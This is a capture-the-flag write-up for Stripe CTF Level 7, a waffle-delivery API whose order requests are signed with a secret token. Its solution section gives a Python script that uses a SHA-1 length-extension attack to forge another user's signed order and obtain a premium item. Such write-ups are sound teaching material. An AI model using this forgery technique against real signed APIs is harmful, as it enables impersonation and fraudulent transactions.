## Level 7

Welcome to the penultimate level, Level 7.

WaffleCopter is a new service delivering locally-sourced organic waffles hot off of vintage waffle irons straight to your location using quad-rotor GPS-enabled helicopters. The service is modeled after [TacoCopter](http://tacocopter.com/), an innovative and highly successful early contender in the airborne food delivery industry. WaffleCopter is currently being tested in private beta in select locations.

Your goal is to order one of the decadent Liège Waffles, offered only to WaffleCopter's first premium subscribers.

Log in to your account at https://level07-1.stripe-ctf.com/user-xxxxxxxxxx with username `ctf` and password `password`. You will find your API credentials after logging in. You can fetch the code for the level via `git clone https://level07-1.stripe-ctf.com/user-xxxxxxxxxx/level07-code`, or you can read it below. You may find the sample API client in `client.py` particularly helpful.

### Running

#### WaffleCopter

WaffleCopter delivers hot waffles fresh off the iron straight to your location using quad-rotor GPS-enabled helicopters. The service is currently being tested in private beta in select locations.

Your goal is to order one of the decadent Liège waffles, offered only to the first premium subscribers of the service.

#### The API

The WaffleCopter API is quite simple. All users have a secret API token that is used to sign POST requests to /v1/orders. Parameters such as the waffle product code and target GPS coordinates are encoded as if for a query string and placed in the request body.

#### The Code

You can use `client.py` to talk to the API, specifying an appropriate API endpoint, user id, and secret key. The app itself is `wafflecopter.py`, which will use a SQLite database created by `initialize_db.py`. To edit flask settings, just create a `local_settings.py` file. The page templates can be found under `templates/`.

### Solution

**Note**: This solution relies upon the sha-ext library available at [http://www.vnsecurity.net/2010/03/codegate_challenge15_sha1_padding_attack/](http://www.vnsecurity.net/2010/03/codegate_challenge15_sha1_padding_attack/). A copy of that library has been copied here.

```python
#!/usr/bin/env python
import requests
from shaext import shaext

ext = shaext("count=10&lat=37.351&user_id=1&long=-119.827&waffle=eggo", 14, "1b0e763096a47ef15ae5744eb39380a2e2353bcd")
ext.add("&user_id=1&waffle=liege")

(new_msg, new_sig) = ext.final()

query = new_msg + '|sig:' + new_sig
resp = requests.post('https://level07-1.stripe-ctf.com/user-xxxxxxxxxx/orders', data=query)
print resp.text
```

Originally posted at [https://stripe-ctf.com/levels/7](https://stripe-ctf.com/levels/7).
